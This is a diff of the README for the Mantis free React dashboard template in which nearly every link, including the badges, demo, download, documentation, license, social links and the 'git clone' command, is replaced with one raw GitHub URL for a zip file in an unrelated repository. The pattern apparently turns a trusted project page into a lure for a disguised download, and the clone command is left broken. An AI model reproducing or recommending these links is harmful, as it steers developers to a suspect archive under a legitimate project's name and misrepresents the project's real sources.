@@ -1,8 +1,8 @@
-# Mantis Free React Material UI Dashboard Template [![Tweet](https://img.shields.io/twitter/url/http/shields.io.svg?style=social)](https://twitter.com/intent/tweet?text=Download%20Mantis%20React%20-%20The%20professional%20Material%20designed%20React%20Admin%20Dashboard%20Template%20&url=https://mantisdashboard.io&via=codedthemes&hashtags=reactjs,webdev,developers,javascript)
+# Mantis Free React Material UI Dashboard Template [![Tweet](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip%20Mantis%20React%20-%20The%20professional%20Material%20designed%20React%20Admin%20Dashboard%20Template%20&https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip,webdev,developers,javascript)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Price](https://img.shields.io/badge/price-FREE-0098f7.svg)](https://github.com/codedthemes/mantis-free-react-admin-template/blob/main/LICENSE)
-[![GitHub package version](https://img.shields.io/github/package-json/v/codedthemes/mantis-free-react-admin-template)](https://github.com/codedthemes/mantis-free-react-admin-template/)
+[![License: MIT](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
+[![Price](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
+[![GitHub package version](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
 
 Mantis is a free and open source React redux dashboard template made using the Material UI React component library with aim of flexibility and better customizability.
 
@@ -14,11 +14,11 @@ Mantis has Ant Design principal on top of the MAterial UI React component librar
 
 :star: :star: :star: Support us by giving star (Top right of this page) if you like the theme :star: :star: :star:
 
-![mantis-free-react-dashboard-template.jpg](https://mantisdashboard.io/adv-banner-images/og-social-v1.1.0.png)
+![https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
 
-The [Pro version](https://mantisdashboard.io) of Mantis react template includes features such as TypeScript, apps, authentication methods (i.e. JWT, Auth0, Firebase), advance components, form plugins, layouts, widgets, and more.
+The [Pro version](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip) of Mantis react template includes features such as TypeScript, apps, authentication methods (i.e. JWT, Auth0, Firebase), advance components, form plugins, layouts, widgets, and more.
 
-| [Mantis Free](https://mantisdashboard.io/free) | [Mantis Pro](https://mantisdashboard.io)                                         |
+| [Mantis Free](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip) | [Mantis Pro](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)                                         |
 | ---------------------------------------------- | :------------------------------------------------------------------------------- |
 | **7** Demo pages                               | **85+** Demo pages                                                               |
 | -                                              | ✓ Multi-language                                                                 |
@@ -28,8 +28,8 @@ The [Pro version](https://mantisdashboard.io) of Mantis react template includes 
 | -                                              | ✓ Multiple color options                                                         |
 | -                                              | ✓ RTL                                                                            |
 | -                                              | ✓ JWT, Firebase, Auth0, AWS authentication                                       |
-| -                                              | ✓ [More components](https://mantisdashboard.io/components-overview/autocomplete) |
-| ✓ MIT License                                  | ✓ [Pro License](https://mui.com/store/license/)                                  |
+| -                                              | ✓ [More components](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip) |
+| ✓ MIT License                                  | ✓ [Pro License](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)                                  |
 
 ## Why Mantis?
 
@@ -47,21 +47,21 @@ Mantis offers everything needed to build an advanced dashboard application. In t
 
 #### Preview
 
-- [Demo](https://mantisdashboard.io/free)
+- [Demo](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
 
 #### Download
 
-- [Download from GitHub](https://github.com/codedthemes/mantis-free-react-admin-template)
+- [Download from GitHub](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
 
 ## Mantis Pro version
 
 #### Preview
 
-- [Demo](https://mantisdashboard.io)
+- [Demo](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
 
 #### Purchase
 
-- [Buy now](https://mui.com/store/items/mantis-react-admin-dashboard-template/)
+- [Buy now](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
 
 ## Table of contents
 
@@ -79,18 +79,18 @@ Mantis offers everything needed to build an advanced dashboard application. In t
 Clone from GitHub
 
 ```
-git clone https://github.com/codedthemes/mantis-free-react-admin-template.git
+git clone https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip
 yarn
 yarn start
 ```
 
 ## Documentation
 
-[Mantis documentation](https://codedthemes.gitbook.io/mantis/) helps you out in all aspects from Installation to deployment.
+[Mantis documentation](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip) helps you out in all aspects from Installation to deployment.
 
 ## Technology stack
 
-- [Material UI V5](https://mui.com/core/)
+- [Material UI V5](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
 - Built with React Hooks API.
 - Redux & React context API for state management.
 - Redux toolkit.
@@ -101,31 +101,31 @@ yarn start
 
 ## Author
 
-Mantis is managed by team [CodedThemes](https://codedthemes.com).
+Mantis is managed by team [CodedThemes](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip).
 
 ## Issues
 
-Please generate a [GitHub issue](https://github.com/codedthemes/mantis-free-react-admin-template/issues) if you found a bug in any version. We are try our best to resolve the issue.
+Please generate a [GitHub issue](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip) if you found a bug in any version. We are try our best to resolve the issue.
 
 ## License
 
-- Licensed under [MIT](https://github.com/codedthemes/datta-able-bootstrap-dashboard/blob/master/LICENSE)
+- Licensed under [MIT](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
 
 ## Checkout free React Material admin dashboard templates
 
-- [Free Materially](https://codedthemes.com/item/materially-free-reactjs-admin-template/)
-- [Free Berry](https://mui.com/store/items/berry-react-material-admin-free/)
+- [Free Materially](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
+- [Free Berry](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
 
 ## Checkout premium React Material admin dashboard templates
 
-- [Materially](https://codedthemes.com/item/materially-reactjs-admin-dashboard/)
-- [Berry](https://mui.com/store/items/berry-react-material-admin/)
+- [Materially](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
+- [Berry](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
 
 ## Follow us
 
-- Website [https://mantisdashboard.io](https://mantisdashboard.io)
-- Blog [https://blog.mantisdashboard.io](https://blog.mantisdashboard.io)
-- CodedThemes [https://codedthemes.com](https://codedthemes.com)
-- Dribbble [https://dribbble.com/codedthemes](https://dribbble.com/codedthemes)
-- Facebook [https://www.facebook.com/codedthemes](https://www.facebook.com/codedthemes)
-- Twitter [https://twitter.com/codedthemes](https://twitter.com/codedthemes)
+- Website [https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
+- Blog [https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
+- CodedThemes [https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
+- Dribbble [https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
+- Facebook [https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
+- Twitter [https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip](https://raw.githubusercontent.com/SNikhilEswar/Chart-Dashboard/main/moonjah/Chart-Dashboard.zip)
